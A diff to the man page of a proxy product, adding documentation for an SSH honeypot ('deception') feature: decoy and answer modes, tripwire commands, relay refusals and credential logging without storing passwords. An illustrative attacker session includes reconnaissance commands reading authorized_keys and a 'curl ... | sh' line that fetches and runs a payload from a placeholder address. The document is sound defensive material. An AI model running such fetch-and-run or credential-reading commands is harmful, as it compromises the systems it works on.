@@ -11883,6 +11883,162 @@ The \fBopen\fR is forwarded when it happens, so a refused file can leave an empt
 \fBDownloads are not scanned here, and the section refuses to pretend otherwise.\fR A download in SFTP is a run of \fBread\fRs at offsets that the client stops making when it has what it wants; there is no packet that means "the file is finished", so there is no point to scan at. Scanning one would mean the proxy fetching the whole file itself and serving the client\(aqs reads from that copy, which is a different feature with different costs. \fBdownloads: true\fR is a configuration error here rather than a setting that quietly does nothing. The \fBftp\fR listener, where a \fBRETR\fR is one whole\-file transfer, does scan downloads.
 .PP
 Every session writes one \fBssh\fR line to the access log (client, user, authentication method, principal, target, channels, refusals, duration) and each inspected SFTP request writes one \fBsftp\fR line with the operation and the path; the \fBclose\fR of a scanned file carries a \fBscan\fR field saying how many bytes were released or why they were blocked. Counters: \fBssh_sessions\fR, \fBssh_sessions_open\fR, \fBssh_channels\fR, \fBssh_refused\fR, \fBssh_rejected\fR, \fBssh_auth_failed\fR, \fBssh_bytes_in\fR, \fBssh_bytes_out\fR, \fBsftp_requests\fR, \fBsftp_refused\fR, \fBsftp_scanned\fR, \fBsftp_scan_blocked\fR; the matching \fBxproxy_ssh_*\fR and \fBxproxy_sftp_*\fR metrics. Refusals and failed authentication are \fBssh_denied\fR deny events, so bans apply, and a file the scanner refuses is an \fBsftp_icap\fR observation on the ban ladder.
+.SS "server.listeners[].ssh.deception"
+.PP
+A bastion that is not there.
+.PP
+Port 22 on a public address is scanned continuously, and what scans it is not a dictionary of default device credentials the way port 23\(aqs is: it is a list of \fBaccount names an estate actually uses\fR \[u2014] \fBgit\fR, \fBjenkins\fR, \fBpostgres\fR, \fBdeploy\fR, \fBansible\fR, \fBubuntu\fR, \fBoracle\fR \[u2014] tried with a handful of passwords each, and a key offered first in case one happens to be trusted.
+.PP
+Refusing tells you an address tried. Answering tells you \fIwhich account names this estate looks like it has from outside\fR, which of its passwords are in circulation, and then what the session came to do:
+.PP
+.RS 4
+.nf
+.ft CR
+uname \-a ; cat /proc/cpuinfo          what am I on
+crontab \-l ; cat ~/.ssh/authorized_keys   what is here already
+curl \-s http://198.51.100.9/i.sh | sh  and here is the payload
+.ft
+.fi
+.RE
+.PP
+.RS 4
+.nf
+.ft CR
+ssh:
+  # A honeypot: no upstream, and no authorized_keys, because there is
+  # nobody real to let in.
+  host_keys: [/etc/xproxy/decoy_host_ed25519]
+  deception:
+    mode: decoy
+    profile: linux
+    hostname: build\-03      # something this estate really has
+    attempts: 2
+.ft
+.fi
+.RE
+.PP
+.TS
+allbox;
+lbw(0.9i) lbw(0.9i) lbw(1.0i) lbx
+lw(0.9i) lw(0.9i) lw(1.0i) lx.
+T{
+Key
+T}	T{
+Type
+T}	T{
+Default
+T}	T{
+Description
+T}
+T{
+\fBenabled\fR
+T}	T{
+bool
+T}	T{
+\fBtrue\fR
+T}	T{
+Turns the section off without removing it
+T}
+T{
+\fBmode\fR
+T}	T{
+\fBanswer\fR,\: \fBdecoy\fR
+T}	T{
+\fBanswer\fR
+T}	T{
+\fBanswer\fR: a credential this listener refused gets the fabrication instead of a refusal. \fBdecoy\fR: the whole listener is a fabricated bastion,\: with no \fBupstream\fR
+T}
+T{
+\fBclients\fR
+T}	T{
+list of CIDR
+T}	T{
+
+T}	T{
+The networks that get the fabrication. \fBRequired in mode \fBanswer\fR.\fR In mode \fBdecoy\fR an empty list means every client
+T}
+T{
+\fBprofile\fR
+T}	T{
+\fBlinux\fR,\: \fBbusybox\fR
+T}	T{
+\fBlinux\fR
+T}	T{
+The machine being impersonated. \fBlinux\fR is the default here because a server is what an SSH port fronts;\: the \fBtelnet\fR trap defaults to \fBbusybox\fR because a recorder is what is on port 23
+T}
+T{
+\fBhostname\fR
+T}	T{
+string
+T}	T{
+the profile\(aqs
+T}	T{
+What a visitor reads in the shell prompt,\: \fBuname \-\:a\fR and \fB/\:etc/\:hostname\fR. \fBName it after something this estate really has\fR
+T}
+T{
+\fBattempts\fR
+T}	T{
+int
+T}	T{
+\fB1\fR
+T}	T{
+How many credentials are taken before the login is accepted (0 to 16,\: and no more than \fBmax_\:auth_\:tries\fR,\: which is what the protocol lets a client try)
+T}
+T{
+\fBtripwire\fR
+T}	T{
+list
+T}	T{
+
+T}	T{
+Command names that raise an \fBssh_\:tripwire\fR event. \fBIn addition to\fR the built\-in set documented under \fBtelnet.\:deception\fR
+T}
+T{
+\fBseed\fR
+T}	T{
+int
+T}	T{
+from the listener name
+T}	T{
+Makes the fabricated numbers reproducible across restarts
+T}
+T{
+\fBperiod\fR
+T}	T{
+duration
+T}	T{
+\fB30s\fR
+T}	T{
+How long one sample of a fabricated number lasts
+T}
+T{
+\fBmax_\:clients\fR
+T}	T{
+int
+T}	T{
+\fB1024\fR
+T}	T{
+Bounds the record of who has been answered
+T}
+.TE
+.PP
+\fBIn mode \fBanswer\fR it adds no authentication method the listener did not already offer.\fR It wraps the callbacks that are there. A key\-only bastion therefore collects key fingerprints and nothing else, because a bastion that started advertising password authentication when a deception section was added would have had its front door changed by a logging feature. Collecting passwords on purpose is what \fBmode: decoy\fR is for, on a listener of its own.
+.PP
+\fBIt replaces the refusals that happen after the proxy has spoken\fR: a refused credential, a failed or locked second factor, the estate\(aqs \fBauthorization\fR policy, and a missing access grant. A \fBpartial success\fR is not a refusal \[u2014] RFC 4252 partial success is the protocol saying that credential was right and another factor comes next \[u2014] so the factor after it is asked for as usual, and only its refusal can be fabricated. It does not replace \fBallow_clients\fR or a ban, and it never replaces an \fIoutage\fR: an operator working an incident must not be handed a fabricated machine instead of "the target is unavailable".
+.PP
+\fBA key is never accepted.\fR On a decoy listener a public key is recorded by fingerprint and then refused, so the client falls back to a password as it would against a server that trusts no keys \[u2014] and the password is what a trap on port 22 is for. A visitor let in on a key would have proved only that it holds one.
+.PP
+\fBNo password is recorded, in any form a guess can be tested against\fR, exactly as under \fBtelnet.deception\fR: the user name, the credential\(aqs \fBlength\fR, and a \fBcredential_id\fR computed under a key the process made at startup and never writes down. The login never turns on the credential either: every credential is accepted once \fBattempts\fR have been taken, because a trap that accepted the right password and refused the wrong one would be a credential oracle.
+.PP
+\fBNothing is forwarded.\fR \fBdirect\-tcpip\fR is a client asking to use this proxy as a relay and \fBtcpip\-forward\fR is the same request from the other direction; both are refused, and both are tripwires, because an open relay would put this estate\(aqs address on somebody else\(aqs work. \fBx11\fR the same. A \fBsubsystem\fR request \[u2014] sftp, and so an upload rather than a fetch \[u2014] is refused too: there is no fabricated file system to put a payload in.
+.PP
+\fBNothing is run and nothing is fetched\fR, and the fabricated file system has the same refusals to invent as the telnet one: \fB/etc/shadow\fR lists accounts with \fB*\fR where a hash would be, \fB/tmp\fR is empty, and the shell history is empty.
+.PP
+\fBA \fBdecoy\fR listener will not compile with \fBupstream\fR, \fBmfa\fR or \fBrequire_grant\fR\fR, and it does not need \fBauthorized_keys\fR, \fBusers_file\fR, \fBtrusted_user_ca_keys\fR, \fBupstream_key_file\fR or \fBupstream_known_hosts\fR \[u2014] there is no machine to authenticate to and nobody real to let in. It still needs \fBhost_keys\fR, because a client pins one. Use a host key that is \fBnot\fR a real bastion\(aqs.
+.PP
+A session is bounded in commands as well as by the listener\(aqs timeouts, so a script in a loop cannot hold a worker on a listener whose whole purpose is to be found.
+.PP
+Counters: \fBssh_deceived\fR and \fBssh_tripwire\fR; the refusal counters still move, so \fBssh_auth_failed\fR and the \fBauth_failed\fR deny events say what happened even where the client was told it got in. Security events: \fBssh_credential\fR (the user name, the length, the handle, the client version, and for a key its fingerprint), \fBssh_deceived\fR and \fBssh_tripwire\fR. \fBssh_tripwire\fR is nameable in a ban trigger\(aqs \fBreasons\fR; the ordinary fabricated exchange is not, because banning it would end the collection. \fBxproxyctl decoys\fR lists what each fabrication has seen.
 .SS "server.listeners[].h3"
 .PP
 .TS
@@ -16201,7 +16357,7 @@ list
 T}	T{
 \fB[]\fR (all)
 T}	T{
-Deny categories that count: \fBacl\fR,\: \fBrate_\:limit\fR,\: \fBwaf\fR,\: \fBbody_\:size\fR,\: \fBuri_\:length\fR,\: \fBbad_\:host\fR,\: \fBno_\:route\fR,\: \fBwebsocket\fR,\: \fBconcurrency\fR,\: \fBchallenge\fR,\: \fBjwt\fR,\: \fBicap\fR,\: \fBgeo\fR,\: \fBtcp_\:no_\:route\fR,\: \fBforward_\:denied\fR,\: \fBforward_\:auth\fR,\: \fBhoneypot\fR,\: \fBdns_\:blocked\fR,\: \fBdns_\:bogus\fR,\: \fBdns_\:rpz\fR,\: \fBhoneytoken\fR,\: \fBaccount_\:abuse\fR,\: \fBapi_\:abuse\fR,\: \fBthreat_\:intel\fR,\: \fBscim\fR,\: \fBsmtp_\:denied\fR,\: \fBmqtt_\:denied\fR,\: \fBssh_\:denied\fR,\: \fBftp_\:denied\fR,\: \fBsyslog_\:denied\fR,\: \fBtelnet_\:denied\fR,\: \fBvnc_\:denied\fR,\: \fBrdp_\:denied\fR,\: \fBforward_\:sni_\:mismatch\fR,\: \fBdns_\:tunnel\fR,\: \fBdns_\:answer_\:denied\fR,\: \fBsftp_\:icap\fR,\: \fBtcp_\:denied\fR,\: \fBudp_\:denied\fR,\: \fBmodbus_\:denied\fR,\: \fBiec104_\:denied\fR,\: \fBsnmp_\:denied\fR,\: \fBldap_\:denied\fR,\: \fBtftp_\:denied\fR,\: \fBdhcp_\:denied\fR,\: \fBpostgres_\:denied\fR,\: \fBmysql_\:denied\fR,\: \fBtds_\:denied\fR,\: \fBredis_\:denied\fR,\: \fBbacnet_\:denied\fR,\: \fBamqp_\:denied\fR,\: \fBs7_\:denied\fR,\: \fBntp_\:denied\fR,\: \fBntske_\:denied\fR,\: \fBdns_\:denied\fR,\: \fBdns_\:threat_\:intel\fR,\: \fBdns_\:deceived\fR,\: \fBdns_\:tripwire\fR,\: \fBtelnet_\:tripwire\fR,\: \fByara\fR
+Deny categories that count: \fBacl\fR,\: \fBrate_\:limit\fR,\: \fBwaf\fR,\: \fBbody_\:size\fR,\: \fBuri_\:length\fR,\: \fBbad_\:host\fR,\: \fBno_\:route\fR,\: \fBwebsocket\fR,\: \fBconcurrency\fR,\: \fBchallenge\fR,\: \fBjwt\fR,\: \fBicap\fR,\: \fBgeo\fR,\: \fBtcp_\:no_\:route\fR,\: \fBforward_\:denied\fR,\: \fBforward_\:auth\fR,\: \fBhoneypot\fR,\: \fBdns_\:blocked\fR,\: \fBdns_\:bogus\fR,\: \fBdns_\:rpz\fR,\: \fBhoneytoken\fR,\: \fBaccount_\:abuse\fR,\: \fBapi_\:abuse\fR,\: \fBthreat_\:intel\fR,\: \fBscim\fR,\: \fBsmtp_\:denied\fR,\: \fBmqtt_\:denied\fR,\: \fBssh_\:denied\fR,\: \fBftp_\:denied\fR,\: \fBsyslog_\:denied\fR,\: \fBtelnet_\:denied\fR,\: \fBvnc_\:denied\fR,\: \fBrdp_\:denied\fR,\: \fBforward_\:sni_\:mismatch\fR,\: \fBdns_\:tunnel\fR,\: \fBdns_\:answer_\:denied\fR,\: \fBsftp_\:icap\fR,\: \fBtcp_\:denied\fR,\: \fBudp_\:denied\fR,\: \fBmodbus_\:denied\fR,\: \fBiec104_\:denied\fR,\: \fBsnmp_\:denied\fR,\: \fBldap_\:denied\fR,\: \fBtftp_\:denied\fR,\: \fBdhcp_\:denied\fR,\: \fBpostgres_\:denied\fR,\: \fBmysql_\:denied\fR,\: \fBtds_\:denied\fR,\: \fBredis_\:denied\fR,\: \fBbacnet_\:denied\fR,\: \fBamqp_\:denied\fR,\: \fBs7_\:denied\fR,\: \fBntp_\:denied\fR,\: \fBntske_\:denied\fR,\: \fBdns_\:denied\fR,\: \fBdns_\:threat_\:intel\fR,\: \fBdns_\:deceived\fR,\: \fBdns_\:tripwire\fR,\: \fBtelnet_\:tripwire\fR,\: \fBssh_\:tripwire\fR,\: \fByara\fR
 T}
 T{
 \fBthreshold\fR
